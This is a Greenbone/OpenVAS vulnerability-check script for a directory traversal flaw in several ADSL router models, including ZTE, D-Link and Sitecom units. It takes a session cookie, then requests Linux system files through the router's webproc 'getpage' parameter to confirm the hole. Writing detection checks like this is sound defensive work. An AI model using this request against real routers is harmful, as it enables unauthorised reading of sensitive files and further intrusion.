if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105242" );
	script_version( "2021-09-20T13:38:59+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_cve_id( "CVE-2015-7252", "CVE-2015-7251", "CVE-2015-7250", "CVE-2015-7249", "CVE-2015-7248" );
	script_name( "Multiple ADSL Routers Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://blog.norsecorp.com/2015/03/20/over-700000-adsl-routers-shipped-with-directory-traversal-vulnerability/" );
	script_tag( name: "impact", value: "A remote attacker could exploit the vulnerability to access arbitrary files that contain
  sensitive information. Information harvested may aid in launching further attacks." );
	script_tag( name: "vuldetect", value: "Send a special crafted HTTP GET request and check the response." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "summary", value: "Multiple ADSL routers are prone to a directory-traversal vulnerability
  because they fail to properly sanitize user-supplied input." );
	script_tag( name: "affected", value: "At least the following router models are vulnerable:

  ZTE H108N, H108NV2.1

  D-Link 2750E, 2730U, 2730E

  Sitecom WLM-3600, WLR-6100, WLR-4100

  FiberHome HG110

  Planet ADN-4101

  Digisol DG-BG4011N

  Observa Telecom BHS_RTA_R1A" );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "last_modification", value: "2021-09-20 13:38:59 +0000 (Mon, 20 Sep 2021)" );
	script_tag( name: "creation_date", value: "2015-03-23 10:41:22 +0100 (Mon, 23 Mar 2015)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_keys( "Host/runs_unixoide" );
	script_require_ports( "Services/www", 8080 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 8080 );
url = "/cgi-bin/webproc?getpage=html/index.html&errorpage=html/main.html&var:menu=setup&var:page=connected&var:retag=1&var:subpage=-";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(ContainsString( buf, "200 OK" ) && ContainsString( tolower( buf ), "set-cookie" ) && ContainsString( buf, "sessionid" )){
	files = traversal_files( "linux" );
	cookie = eregmatch( pattern: "set-cookie: sessionid=([^ ;]+)", string: buf, icase: TRUE );
	if(isnull( cookie[1] )){
		exit( 0 );
	}
	for pattern in keys( files ) {
		file = files[pattern];
		url = "/cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/" + file;
		if(http_vuln_check( port: port, url: url, pattern: pattern, cookie: "sessionid=" + cookie[1] )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

